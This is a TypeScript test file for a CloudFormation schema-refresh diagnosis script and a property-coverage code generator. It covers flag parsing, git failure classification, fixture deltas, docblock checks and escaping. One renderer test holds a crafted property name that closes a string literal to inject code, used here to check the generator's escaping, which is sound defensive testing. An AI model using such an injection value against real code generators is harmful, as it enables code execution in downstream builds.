  it('accepts the documented flags in both the space and glued spellings', () => {
    // The inverse: a guard that refused a REAL flag would be caught here
    // rather than in the workflow.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks=property-coverage',
      '--skipped-log',
      '/dev/null',
    ]);
    expect(md).not.toContain('unrecognized flag');
  }, 60_000);

  it('refuses a flag given more than once, in every spelling', () => {
    // `rawArg` reads exactly ONE of them, and which one depends on the
    // spelling: it looks for the glued form first, so the third case below
    // reads 3 while the other two read 0. Either way a value is silently
    // discarded — the last argv shape that still reached a confident answer.
    for (const argv of [
      ['--nested-key-rc', '0', '--nested-key-rc', '3'],
      ['--nested-key-rc=0', '--nested-key-rc=3'],
      ['--nested-key-rc', '0', '--nested-key-rc=3'],
    ]) {
      const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, argv);
      expect(md, `accepted ${argv.join(' ')}`).toContain('given more than once');
      expect(md).not.toContain('Nothing in this refresh needs a decision');
    }
  }, 60_000);

  it('renders a case-divergence without asking npm anything', () => {
    const md = run(
      'nested-key-coverage: FAIL — nested CFn->SDK key divergence(s) detected.\n' +
        '  AWS::ECS::Service: someKey [case-divergence] (SDK models `SomeKey`)\n'
    );
    expect(md).toContain('AWS::ECS::Service');
    expect(md).toContain('someKey');
    expect(md).toContain('case-divergence');
    // The lag section is the network-touching one and a case divergence must
    // not reach it.
    expect(md).not.toContain('Installed vs published');
  }, 60_000);
});

describe('collectFixtureDeltas', () => {
  const base = {
    providerFiles: new Map([['AWS::Glue::Connection', 'src/provisioning/providers/glue-provider.ts']]),
    declared: new Map([['AWS::Glue::Connection', new Set(['OldProp'])]]),
    declarationCandidates: () => [],
    sdkEvidence: () => undefined,
  };
  // The REAL fixture shape, checked against `tests/fixtures/cfn-schemas/`:
  // `properties` is an array of bare names and `readOnlyProperties` likewise.
  // The first draft of this helper used an object map and `/properties/X`
  // paths, and every case reported an empty delta — a fixture that does not
  // encode what its consumer reads proves nothing about the consumer.
  const fixture = (props: string[], readOnly: string[] = []) =>
    JSON.stringify({
      resourceType: 'AWS::Glue::Connection',
      properties: props,
      readOnlyProperties: readOnly,
    });

  it('COUNTS a fixture whose comparison threw, rather than skipping it', () => {
    // The branch that could be deleted with the whole suite green. A type that
    // throws vanishes from the removal AND the addition accounting at once, so
    // the residue reads as "additions only" rather than as silent — and the
    // renderer, which IS pinned, never sees that it happened.
    const out = collectFixtureDeltas({
      ...base,
      files: ['broken.json'],
      committedOf: () => '{ not json',
      currentOf: () => fixture(['A']),
    });
    expect(out.unreadable).toEqual(['broken.json']);
    expect(out.removed).toEqual([]);
    expect(out.writableAdded).toEqual([]);
  });

  it('COUNTS a fixture whose committed side could not be READ', () => {
    // `git show` failing (git absent, a broken repo, the 32 MB buffer) used to
    // be `undefined` — the same value as "not in HEAD" — so every fixture
    // looked brand-new and the whole refresh looked clean, over a step that
    // only runs when drift exists.
    let readCurrent = 0;
    const out = collectFixtureDeltas({
      ...base,
      files: ['AWS-Glue-Connection.json'],
      committedOf: () => UNREADABLE,
      currentOf: () => {
        readCurrent += 1;
        return fixture(['A']);
      },
    });
    expect(out.unreadable).toEqual(['AWS-Glue-Connection.json']);
    // Discriminating: without the explicit branch the sentinel falls through to
    // `comparePropertySets`, which throws and lands in the SAME list — the same
    // answer by accident. Reaching the current side at all is the difference,
    // and it is the wasteful, fragile path.
    expect(readCurrent, 'the sentinel fell through to the comparison').toBe(0);
  });

  it('classifies real git failures: path-not-in-HEAD is new, the rest are unreadable', () => {
    // Measured against real git output. `unknown revision` and `invalid object`
    // are whole-REVISION failures — an unborn HEAD says
    // `fatal: invalid object name 'HEAD'` — and matching them as "brand-new"
    // made every fixture look new and the refresh look clean, the exact
    // fail-open this classification closes. Neither can match a genuine
    // path-not-in-HEAD, which says `does not exist in 'HEAD'`.
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-git-'));
    try {
      execFileSync('git', ['init', '-q', dir]);
      // Unborn HEAD: a whole-revision failure, NOT a missing path.
      const unborn = (() => {
        try {
          execFileSync('git', ['show', 'HEAD:anything'], { cwd: dir, encoding: 'utf8' });
          return '';
        } catch (e) {
          return String((e as { stderr?: unknown }).stderr ?? '');
        }
      })();
      expect(unborn, 'git no longer reports an unborn HEAD this way').not.toBe('');
      // The CLASSIFICATION, not just what git prints: matching the
      // whole-revision wording as "brand-new" is what made a broken repository
      // render the refresh as clean.
      expect(classifyGitShowFailure(unborn)).toBe(UNREADABLE);

      // And the genuine path-not-in-HEAD, from a repo that HAS a commit.
      writeFileSync(join(dir, 'seed.txt'), 'x');
      execFileSync('git', ['-C', dir, 'add', 'seed.txt']);
      execFileSync('git', ['-C', dir, '-c', 'user.email=t@e', '-c', 'user.name=t', 'commit', '-qm', 's']);
      const missing = (() => {
        try {
          execFileSync('git', ['show', 'HEAD:nope.json'], { cwd: dir, encoding: 'utf8' });
          return '';
        } catch (e) {
          return String((e as { stderr?: unknown }).stderr ?? '');
        }
      })();
      expect(classifyGitShowFailure(missing)).toBeUndefined();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);

  it('treats a git failure with no recognisable wording as unreadable', () => {
    // ENOENT and ENOBUFS both surface with empty stderr — the safe direction is
    // "could not read", never "brand-new".
    expect(classifyGitShowFailure('')).toBe(UNREADABLE);
    expect(classifyGitShowFailure('fatal: not a git repository')).toBe(UNREADABLE);
  });

  it('falls back to the filename as a TYPE name, not as a filename', () => {
    // A fixture missing `resourceType` yields the stem, which is hyphenated —
    // and `renderName` rejects hyphens, so the heading became
    // `**[name rejected]**`. The declared-property lookup misses either way,
    // but a legible heading says which type it missed for. Same shape as the
    // two render sites the previous two rounds fixed.
    const out = collectFixtureDeltas({
      ...base,
      files: ['AWS-Glue-Connection.json'],
      committedOf: () => JSON.stringify({ properties: ['A'] }),
      currentOf: () => JSON.stringify({ properties: [] }),
      declared: new Map([['AWS::Glue::Connection', new Set(['A'])]]),
    });
    expect(out.removed[0]!.resourceType).toBe('AWS::Glue::Connection');
    const md = renderDiagnosis({
      removed: out.removed,
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).not.toContain('rejected');
  });

  it('skips a BRAND-NEW fixture silently, which is not the same thing', () => {
    // No committed side means nothing to compare, not something unreadable —
    // counting it would put every newly captured type in the warning list.
    const out = collectFixtureDeltas({
      ...base,
      files: ['new.json'],
      committedOf: () => undefined,
      currentOf: () => fixture(['A']),
    });
    expect(out.unreadable).toEqual([]);
    expect(out.writableAdded).toEqual([]);
  });

  it('looks the provider up by RESOURCE TYPE, and stores what it found', () => {
    // The four original cases asserted only the counts, and `base` stubs both
    // collaborators to ignore their arguments — so keying the provider lookup
    // on the FILENAME instead of the type, dropping the SDK evidence, and
    // dropping the rename pairing were each invisible. The SDK evidence is
    // fact #2 of this script's whole purpose.
    const seen: Array<[string, string | undefined, string | undefined]> = [];
    const out = collectFixtureDeltas({
      ...base,
      files: ['AWS-Glue-Connection.json'],
      committedOf: () => fixture(['OldProp']),
      currentOf: () => fixture(['OldPropV2'], []),
      declarationCandidates: (property, providerRelPath, resourceType) => {
        seen.push([property, providerRelPath, resourceType]);
        return ['src/provisioning/providers/glue-provider.ts:42'];
      },
      sdkEvidence: (property, providerRelPath) => ({
        client: `client-for:${providerRelPath}`,
        modelled: true,
      }),
    });
    // Looked up by TYPE — the filename would resolve to nothing in the map.
    expect(seen).toEqual([
      ['OldProp', 'src/provisioning/providers/glue-provider.ts', 'AWS::Glue::Connection'],
    ]);
    const entry = out.removed[0]!;
    expect(entry.providerPath).toBe('src/provisioning/providers/glue-provider.ts');
    expect(entry.candidates['OldProp']).toEqual([
      'src/provisioning/providers/glue-provider.ts:42',
    ]);
    expect(entry.sdk!['OldProp']!.client).toBe(
      'client-for:src/provisioning/providers/glue-provider.ts'
    );
    // And the rename pairing runs against THIS delta's writable additions.
    expect(entry.renameCandidates!['OldProp']).toEqual(['OldPropV2']);
  });

  it('reports a removal only when the provider DECLARES the property', () => {
    const out = collectFixtureDeltas({
      ...base,
      files: ['glue.json'],
      committedOf: () => fixture(['OldProp', 'Undeclared']),
      currentOf: () => fixture([]),
    });
    expect(out.removed).toHaveLength(1);
    expect(out.removed[0]!.properties).toEqual(['OldProp']);
  });

  it('splits an addition by whether it is settable', () => {
    const out = collectFixtureDeltas({
      ...base,
      files: ['glue.json'],
      committedOf: () => fixture([]),
      currentOf: () => fixture(['Settable', 'ComputedArn'], ['ComputedArn']),
    });
    expect(out.writableAdded).toEqual([
      { resourceType: 'AWS::Glue::Connection', properties: ['Settable'] },
    ]);
    expect(out.readOnlyAddedCount).toBe(1);
  });
});

describe('the module’s own doc comments', () => {
  /**
   * The orphan predicate, extracted so it can be driven with SHAPES rather than
   * only pointed at the real file. Pointed only at the file, the rule this
   * round widened — a one-line type annotation ATTACHES — had no case at all:
   * the probe that exercises it restores a shape the fence now accepts, so it
   * is green either way.
   */
  const orphansIn = (src: string): string[] => {
    const lines = src.split('\n');
    const found: string[] = [];
    let blockStart = -1;
    let seenBlocks = 0;
    for (let i = 0; i < lines.length; i++) {
      if (lines[i]!.trim() === '/**') blockStart = i;
      if (lines[i] !== ' */') continue;
      seenBlocks += 1;
      const body = lines.slice(blockStart, i).join('\n');
      // The FILE header documents the module and a `@typedef`-only block
      // documents types; neither attaches to a declaration.
      const attaches = seenBlocks > 1 && !/@typedef/.test(body);
      const nextLine = (lines[i + 1] ?? '').trim();
      const declares =
        /^(export\s+)?(export\s+default\s+)?(async\s+)?(function|class|const|let|var)\s/.test(
          nextLine
        ) || /^\/\*\*.*\*\/$/.test(nextLine);
      if (attaches && !declares) found.push(`line ${i + 2}: ${JSON.stringify(nextLine)}`);
    }
    return found;
  };

  const withHeader = (tail: string) => ['/**', ' * header', ' */', '', tail].join('\n');

  it('flags a block followed by a blank line, another block, or a comment', () => {
    expect(orphansIn(withHeader('/**\n * doc\n */\n\nexport function f() {}'))).toHaveLength(1);
    expect(
      orphansIn(withHeader('/**\n * a\n */\n/**\n * b\n */\nexport function f() {}'))
    ).toHaveLength(1);
    expect(orphansIn(withHeader('/**\n * doc\n */\n// stray\nexport function f() {}'))).toHaveLength(
      1
    );
  });

  it('accepts every shape that really does attach', () => {
    // The one-line type annotation is the ordinary JSDoc way to type a `const`.
    // The first cut flagged it, so the module was edited to suit the fence
    // rather than the other way round.
    for (const tail of [
      '/**\n * doc\n */\nexport function f() {}',
      '/**\n * doc\n */\nfunction f() {}',
      '/**\n * doc\n */\nexport const x = 1;',
      '/**\n * doc\n */\nexport default function f() {}',
      '/**\n * doc\n */\n/** @type {string} */\nexport const x = "a";',
      '/**\n * @typedef {A} B\n */\n\nconst unrelated = 1;',
    ]) {
      expect(orphansIn(withHeader(tail)), `flagged an attached shape: ${tail}`).toEqual([]);
    }
  });

  it('finds none in the real module', () => {
    // BOUND, stated because an over-claimed fence is what this file keeps
    // finding: it cannot see an undocumented declaration slipped BETWEEN a
    // docblock and its function — that still reads as "block, then a
    // declaration". Nothing else covers that shape either: `checkJs` appears in
    // NO tsconfig and NO workflow here, so the runs that caught two of this
    // session's orphan incidents were by hand, not a control.
    const src = readFileSync(join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs'), 'utf8');
    expect(orphansIn(src), 'a docblock is not attached to a declaration').toEqual([]);
    expect(src.split('\n').filter((l) => l === ' */').length).toBeGreaterThan(20);
  });
});

describe('the script\u2019s own synopsis', () => {
  const SRC = readFileSync(join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs'), 'utf8');
  const header = SRC.slice(0, SRC.indexOf(' */'));

  it('documents exactly the flags it accepts', () => {
    // It documented `--property-coverage-rc` for two rounds after
    // `--failed-checks` replaced it, and named `--failed-checks` nowhere — so
    // following the script's OWN usage produced "additions only" over a red
    // check, the verdict six rounds went into closing, reached through the
    // documentation. Both directions, so a new flag cannot ship undocumented
    // and a retired one cannot linger.
    // The SYNOPSIS, not the whole docblock: matching across the header let a
    // flag survive in prose while being dropped from the invocation, which is
    // the half a reader copies — and the assertion message said "synopsis".
    const lines = header.split('\n').map((l) => l.replace(/^\s*\*\s?/, ''));
    const start = lines.findIndex((l) => l.includes('node scripts/diagnose-schema-refresh.mjs'));
    expect(start, 'the synopsis no longer shows the invocation').toBeGreaterThan(-1);
    const synopsis: string[] = [];
    for (let i = start; i < lines.length && lines[i]!.trim() !== ''; i++) synopsis.push(lines[i]!);
    const documented = [...synopsis.join('\n').matchAll(/(--[a-z][a-z-]*)/g)].map((m) => m[1]!);
    expect(new Set(documented), 'the synopsis and the accepted set disagree').toEqual(
      new Set(KNOWN_FLAGS)
    );
  });

  it('has a synopsis that would actually paste', () => {
    // Line 39 ended `\\`, which terminates the command in bash and passes a
    // literal backslash — the same class the guidance's command block is
    // fenced for, one file over and unfenced.
    const lines = header.split('\n');
    const start = lines.findIndex((l) => l.includes('node scripts/diagnose-schema-refresh.mjs'));
    expect(start, 'the synopsis no longer shows the invocation').toBeGreaterThan(-1);
    for (let i = start; i < lines.length; i++) {
      const body = lines[i]!.replace(/^\s*\*\s?/, '');
      if (body.trim() === '') break;
      const isLast = i + 1 >= lines.length || lines[i + 1]!.replace(/^\s*\*\s?/, '').trim() === '';
      if (isLast) {
        expect(body.endsWith('\\'), `the last synopsis line dangles a continuation`).toBe(false);
      } else {
        // Exactly one. A DOUBLED backslash terminates the command and passes a
        // literal `\`; a MISSING one ends the command early. The first fence
        // covered only the doubled spelling — the same one-spelling shape it
        // was written to catch.
        expect(body.endsWith('\\'), `line ${i + 1} does not continue`).toBe(true);
        expect(body.endsWith('\\\\'), `line ${i + 1} ends in a DOUBLED backslash`).toBe(false);
      }
    }
  });

});

describe('assertFixtureFloor', () => {
  it('refuses an EMPTY listing rather than reporting from it', () => {
    // The last input in the module without a floor. Empty yields empty
    // removals AND empty additions, which renders as "additions only" — every
    // sibling input already refuses a short read.
    expect(() => assertFixtureFloor(0, 134)).toThrow(/no schema fixtures found/);
  });

  it('refuses a listing far short of the coverage table', () => {
    expect(() => assertFixtureFloor(3, 134)).toThrow(/far short of the coverage table/);
  });

  it('is reached by the real run — an empty fixtures dir refuses end to end', () => {
    // Replaces a source-shape assertion that claimed "no seam reaches this
    // call site". That was false, and the assertion could not see the call
    // wrapped in `try {} catch {}` — which measured as printing the exact
    // clean verdict the floor exists to prevent. `--fixtures-dir=` makes the
    // real path testable.
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-empty-fixtures-'));
    try {
      let out = '';
      try {
        out = execFileSync(
          'node',
          [
            join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs'),
            `--fixtures-dir=${dir}`,
          ],
          { encoding: 'utf8' }
        );
      } catch (e) {
        out = String((e as { stdout?: unknown }).stdout ?? '');
      }
      expect(out).toContain('no schema fixtures found');
      expect(out).not.toContain('Nothing in this refresh needs a decision');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);

  it('accepts the real tree, and does not fire when the table is empty', () => {
    // Bound to the DECLARED count rather than a constant: the two move
    // together, so a hand-picked number goes stale. Driven by the real
    // directory so a future refresh cannot silently cross the floor.
    const files = readdirSync(join(REPO_ROOT, 'tests/fixtures/cfn-schemas')).filter(
      (f) => f.endsWith('.json') && !f.startsWith('_')
    );
    const declared = loadDeclaredProperties();
    expect(files.length).toBeGreaterThan(100);
    expect(() => assertFixtureFloor(files.length, declared.size)).not.toThrow();
    // (`assertFixtureFloor(1, 0)` was asserted here and could not fail:
    // `1 * 2 < 0` is false whatever the guard does. The dead `declaredCount > 0`
    // conjunct it was written for is gone.)
  });
});

describe('the sibling type declarations', () => {
  it('type-checks on their own', () => {
    // Nothing in CI type-checks `scripts/**`: `tsconfig.json` includes only
    // `src/**` + `types/**`, and `tsconfig.test.json` takes `scripts/**\/*.ts`,
    // not `.d.mts`. A duplicated `KNOWN_FLAGS` declaration therefore sat in
    // this file until review found it by running tsc by hand — and
    // `skipLibCheck` hides exactly that class.
    const out = spawnSync(
      'npx',
      [
        'tsc',
        '--ignoreConfig',
        '--noEmit',
        '--skipLibCheck',
        'false',
        join(REPO_ROOT, 'scripts/diagnose-schema-refresh.d.mts'),
      ],
      { encoding: 'utf8' }
    );
    expect(`${out.stdout}${out.stderr}`.trim(), 'the declarations do not type-check').toBe('');
    expect(out.status).toBe(0);
  }, 120_000);
});

describe('the generated-module renderers', () => {
  it('escapes a name that would otherwise close the literal', async () => {
    // The fix had NO test: reverting both renderers to hand-quoting left 3041
    // cases green. A property name comes from AWS's public bundle, and this
    // module is executed by the refresh workflow, by the bot PR's own CI, and
    // shipped to npm — so a name closing the literal is code execution, not a
    // broken file.
    const { renderHandled, renderSilentDrop } = await import(
      '../../../scripts/gen-property-coverage.ts'
    );
    const hostile = "zzz', (globalThis.OWNED = 1)] // ";

    const handled = renderHandled([hostile]);
    expect(handled, 'the name closed its own literal').not.toContain("'zzz',");
    expect(handled).toContain(JSON.stringify(hostile));

    const drops = renderSilentDrop([[hostile, 'because']]);
    expect(drops).not.toContain("['zzz',");
    expect(drops).toContain(JSON.stringify(hostile));

    // A weaker check than it looks, stated as such: `new Function` parses
    // `new Set<string>([...])` as relational operators, not as the TypeScript
    // it is — so this does NOT prove the emission is valid TS. It does throw on
    // the hostile emission, which is the discrimination being bought here; the
    // TS validity of the whole module is covered by the build.
    expect(() => new Function(`return ${handled}`)).not.toThrow();
    expect(() => new Function(`return ${drops}`)).not.toThrow();
  });

  it('escapes the TYPE key too, not only the two renderers', async () => {
    // The third site this PR escaped, and the one the cases missed: the
    // rationale comment says "in BOTH renderers", which excludes the entry key
    // by wording. Its input is provider-source-derived rather than
    // bundle-derived, so this is a test gap and not an exposure — but a raw
    // interpolation left beside two hardened ones is the ambiguity the comment
    // exists to remove.
    const mod = await import('../../../scripts/gen-property-coverage.ts');
    const src = readFileSync(join(REPO_ROOT, 'scripts/gen-property-coverage.ts'), 'utf8');
    expect(mod).toBeDefined();
    // The emitted entry key must go through JSON.stringify like its siblings.
    expect(src, 'the entry key is interpolated raw').not.toMatch(/^\s*'\$\{type\}',$/m);
    expect(src).toMatch(/\$\{JSON\.stringify\(type\)\},/);
  });

  it('emits DOUBLE quotes, which the formatter normalises back', async () => {
    // The committed module is regenerated in CI and diffed byte-for-byte, so
    // the quote change `JSON.stringify` introduces must be undone by `vp run
    // format` (`singleQuote: true`) — which the workflow and the CI staleness
    // guard both run before diffing. Asserting the raw emission keeps that
    // dependency visible instead of implicit.
    const { renderHandled } = await import('../../../scripts/gen-property-coverage.ts');
    expect(renderHandled(['Alpha'])).toContain('"Alpha"');
    expect(renderHandled(['Alpha'])).not.toContain("'Alpha'");
  });
});
